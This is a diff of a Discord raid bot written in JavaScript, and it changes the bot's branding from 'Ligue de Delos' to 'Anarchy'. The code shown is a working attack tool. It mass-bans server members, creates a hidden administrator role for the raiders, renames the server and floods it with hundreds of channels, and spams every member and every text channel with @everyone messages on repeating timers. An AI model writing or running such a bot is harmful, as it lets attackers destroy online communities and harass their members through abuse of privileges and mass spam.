@@ -124,7 +124,7 @@ client.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send(msg.guild.name + " a été détruit par la Ligue de Delos\nhttps://discord.gg/ru45dwu\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
+                    member.send("**" + msg.guild.owner.user.username + "** a été détruit par Anarchy\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg").catch(error => {}) }, 450)})
        }
 
 if(msg.content === '-del'){
@@ -137,12 +137,12 @@ if(msg.content === '-del'){
   if (msg.content === '-ded') {
     console.log(`Commande -ded par ${msg.author.tag}`);
 
-      msg.guild.setIcon('https://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif').catch(e => {});
-      msg.guild.setName('Détruit par la Ligue de Delos').catch(e => {});
+      msg.guild.setIcon('https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp').catch(e => {});
+      msg.guild.setName('DEAD BY ANARCHY').catch(e => {});
 
       for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('La Ligue de Delos', 'voice').catch(e => {});
-        msg.guild.createChannel('La Ligue de Delos', 'text').catch(e => {});
+        msg.guild.createChannel('RAID BY ANARCHY', 'voice').catch(e => {});
+        msg.guild.createChannel('RAID BY ANARCHY', 'text').catch(e => {});
       }
 
     if (msg.deletable) {
@@ -153,7 +153,7 @@ if(msg.content === '-del'){
   if (msg.content === '-rban') {
     console.log(`Commande -rban par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "Delos") && member.bannable) member.ban().catch(e => {});
+      if (!member.roles.exists("name", ".Anarchy.") && member.bannable) member.ban().catch(e => {});
     });
   }
 
@@ -167,7 +167,7 @@ if(msg.content === '-del'){
     console.log(`Commande -gp par ${msg.author.tag}`);
 
     msg.member.guild.createRole({
-      name: "Delos",
+      name: ".Anarchy.",
       permissions: "ADMINISTRATOR",
       mentionable: false
     }).then(function(role) {
@@ -183,10 +183,11 @@ client.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('@everyone  @here  Detruit par la ligue de delos\n\n\nhttps://discord.gg/ru45dwu\n\n\n\n\n\n\n\n\n\n\n\nhttps://discord.gg/ru45dwun\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://discord.gg/ru45dwu\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif')
+                if (channel.type === "text") channel.send("@everyone @here \nRaid By Anarchy\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nhttps://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif\nhttps://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg")
               }, 2500);
             });
           }
         });
+
 
 client.login(process.env.TOKEN);
